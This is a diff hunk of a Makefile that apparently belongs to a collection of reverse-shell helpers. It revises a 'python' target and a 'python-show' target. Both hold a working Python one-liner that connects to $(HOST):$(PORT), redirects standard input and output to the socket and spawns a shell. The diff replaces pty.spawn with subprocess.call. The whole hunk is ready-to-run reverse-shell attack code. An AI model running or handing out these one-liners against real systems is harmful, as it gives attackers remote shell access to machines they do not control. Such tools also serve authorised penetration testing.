@@ -147,10 +147,10 @@ openssl-show:
 ########################## PYTHON ##########################
 
 python:
-	python -c 'import sys,socket,os,pty; s = socket.socket(); s.connect(("$(HOST)",$(PORT))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("$(SHELL)")'
+	python -c 'import socket,os,subprocess; s = socket.socket(); s.connect(("$(HOST)",$(PORT))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call(["$(SHELL)"])'
 
 python-show:
-	@printf "python -c 'import sys,socket,os,pty; s = socket.socket(); s.connect((\"$(HOST)\",$(PORT))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"$(SHELL)\")'\n"
+	@printf "python -c 'import socket,os,subprocess; s = socket.socket(); s.connect((\"$(HOST)\",$(PORT))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call([\"$(SHELL)\"])'\n"
 
 ############################################################
 
